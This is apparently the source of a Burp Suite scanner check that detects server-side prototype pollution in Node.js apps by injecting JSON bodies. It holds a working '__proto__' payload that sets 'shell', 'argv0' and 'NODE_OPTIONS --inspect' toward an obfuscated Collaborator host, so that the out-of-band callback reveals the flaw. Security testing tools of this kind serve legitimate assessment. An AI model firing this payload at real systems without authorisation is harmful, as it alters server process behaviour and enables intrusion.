package burp;

import com.google.gson.*;

import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static burp.PrototypePollutionBodyScan.MAX_RETRIES;

public class PrototypePollutionAsyncBodyScan extends Scan {
    final Boolean injectSpecificProperties = false;
    final static String collaboratorPlaceholder = "$collaborator_placeholder";
    static final Map<String, String[]> asyncTechniques = new HashMap<String, String[]>()
    {
        {
            put("async", new String[]{
                    "__proto__"," {\n" +
                    "\"argv0\":\"node\",\n" +
                    "\"shell\":\"node\",\n" +
                    "\"NODE_OPTIONS\":\"--inspect="+collaboratorPlaceholder+"\"\n" +
                    "}"
            });
        }
    };

    @Override
    public List<IScanIssue> doScan(byte[] baseReq, IHttpService service) {
        if(Utilities.globalSettings.getBoolean("async technique")) {
            Utilities.out("--Running async body scan--");
        }
        if (!Utilities.isBurpPro()) {
            Utilities.err("Burp Collaborator is not supported in the community edition");
            return null;
        }
        for (Map.Entry<String, String[]> technique : asyncTechniques.entrySet()) {
            if(!PrototypePollutionBodyScan.shouldUseTechnique(technique)) {
                continue;
            }
            ArrayList<String> collabPayloads = new ArrayList<>();
            String[] vector = new String[] {
                    technique.getValue()[0],
                    replacePlaceholderWithCollaboratorPayload(technique.getValue()[1], collabPayloads)
            };
            doAttack(baseReq, Utilities.getBody(baseReq), service, vector, collabPayloads);
        }

        return null;
    }

    public void doAttack(byte[] baseReq, String jsonString, IHttpService service, String[] vector, ArrayList<String> collabPayloads) {
        if(!jsonString.trim().startsWith("{") && !jsonString.trim().startsWith("[")) {
            return;
        }
        JsonElement attackJson = PrototypePollutionBodyScan.generateJson(jsonString, vector, false);
        byte[] attackRequest = baseReq.clone();
        if (attackJson != null && !attackJson.isJsonNull()) {
            attackRequest = Utilities.setBody(attackRequest, attackJson.toString());
            attackRequest = Utilities.fixContentLength(attackRequest);
            Resp reqResp = request(service, attackRequest, MAX_RETRIES);
            int reqId = -1;
            if(collabPayloads.size() > 0) {
                if(reqResp != null) {
                    reqId = BurpExtender.collab.addRequest(new MetaRequest(reqResp.getReq()));
                }
            }
            for (String collabPayload : collabPayloads) {
                if(reqId > -1) {
                    BurpExtender.collab.addCollboratorPayload(collabPayload, reqId);
                }
            }
        } else {
            Utilities.err("Invalid JSON:" + attackJson.toString());
        }
    }

    static String replacePlaceholderWithCollaboratorPayload(String vector, ArrayList<String> collabPayloads) {
        Matcher m = Pattern.compile(collaboratorPlaceholder.replace("$", "\\$")).matcher(vector);
        while (m.find()) {
            String collaboratorPayloadID = BurpExtender.collab.generateCollabId();
            collabPayloads.add(collaboratorPayloadID);
            vector = vector.replaceFirst(collaboratorPlaceholder.replace("$", "\\$"), obfuscateHost(collaboratorPayloadID+"."+BurpExtender.collab.getCollabLocation()));
        }
        return vector;
    }

    static String obfuscateHost(String host) {
        return host.replaceAll("[.]","\\\\\\\\\"\\\\\\\\\".");
    }

    PrototypePollutionAsyncBodyScan(String name) {
        super(name);
        scanSettings.register("__proto__ techniques enabled", true, "This enables __proto__ based attacks");
        scanSettings.register("constructor techniques enabled", false, "This enables constructor.prototype based attacks");
        scanSettings.register("status technique", true, "This enables the status technique");
        scanSettings.register("spacing technique", true, "This enables the spacing technique");
        scanSettings.register("options technique", true, "This enables the options technique");
        scanSettings.register("exposedHeaders technique", true, "This enables the exposedHeaders technique");
        scanSettings.register("blitz technique", true, "This enables the blitz technique");
        scanSettings.register("reflection technique", true, "This enables the reflection technique");
        scanSettings.register("non reflected property technique", true, "This enables the non reflected property technique");
        scanSettings.register("async technique", true, "This enables the async technique");
    }

}
